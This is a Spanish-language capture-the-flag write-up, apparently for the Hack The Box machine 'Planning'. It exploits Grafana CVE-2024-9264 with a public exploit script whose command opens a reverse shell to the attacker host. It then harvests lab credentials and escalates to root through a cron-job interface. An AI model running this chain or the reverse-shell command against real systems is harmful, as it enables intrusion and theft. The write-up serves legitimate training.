---
layout: post
title: "Planning"
date: 2026-01-23 00:00:00 +0100
tags: ["Docker", "CVE", "Crontab"]
os: "Linux"
level: "Easy"
image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/c9efb253e7d1d9b407113e11afdaa905.png"
---

La maquina provee la siguiente información:
> *As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r*

Enumeración de puertos
```java
sudo nmap -sC -sV -p22,80 -Pn -n --open planning.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-13 18:53 CEST
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
```

Enumeración de directorios

![](/assets/machines/planning.htb/images/f7181aa6-324c-4543-97c6-358c601675fb.webp)

Iniciar sesión en Grafana.

![](/assets/machines/planning.htb/images/bee4c424-5500-41a2-80a1-46913569eef8.webp)

Versión Grafana.

![](/assets/machines/planning.htb/images/3e91e171-cb4a-4c7f-8b2a-3ecb19fa1a0d.webp)

La versión de grafana v11.0.0 es vulnerable al CVE-2024-9264.

> [z3k0sec/CVE-2024-9264-RCE-Exploit: Grafana RCE exploit (CVE-2024-9264)](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit?tab=readme-ov-file#description)

Establecer una reverse shell.

```bash
$ python poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.115 --reverse-port 9000
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 9000
```

![](/assets/machines/planning.htb/images/6f776cf8-fb9c-4033-ab34-2c1bdceefd38.webp)

Una vez dentro somos ``root`` pero de un contenedor de Docker.

Contraseña encontrada: `RioTecRANDEntANT!` usando el comando `env`.

![](attachments/Pasted%20image%2020260123191958.png)

Usamos las credenciales `enzo:RioTecRANDEntANT!` para iniciar sesión por SSH.

El fichero `/var/www/web/enroll.php` contiene las credenciales root para la base de datos `root:EXTRapHY`. Pero no nos van a servir para nada.

![](/assets/machines/planning.htb/images/80339739-5654-48fc-ba2a-103409f78503.webp)

Por otra parte, en `/opt/crontabs/crontab.db` encontraremos unas credenciales `P4ssw0rdS0pRi0T3c`.

![](/assets/machines/planning.htb/images/ad4147b8-5624-47f8-b0d2-fc2235260cbc.webp)

Hay un puerto 8000 abierto.

![](/assets/machines/planning.htb/images/db897963-b63a-4e87-a831-9ffdd7c175a6.webp)

Usar Port Forwarding para llegar al puerto 8000 desde la la máquina atacante.

![](/assets/machines/planning.htb/images/b10457da-dc41-47f8-bdfd-0b396f6df754.webp)

Iniciar sesión con las credenciales `root:P4ssw0rdS0pRi0T3c`.

![](/assets/machines/planning.htb/images/94662cc4-ef72-4784-a548-aeaca3f7561c.webp)

Crear un job con una reverse shell.

![](/assets/machines/planning.htb/images/a7e32601-e328-4398-b91a-073e37ecd0bd.webp)

Clicar en "Run now".

![](/assets/machines/planning.htb/images/e27ff747-3481-4d52-9087-b2ceb5401a58.webp)

Obtemos el `root.txt`.

![](/assets/machines/planning.htb/images/0386e09f-66a0-42a4-a760-10853d91f7b1.webp)

¡Happy Hacking!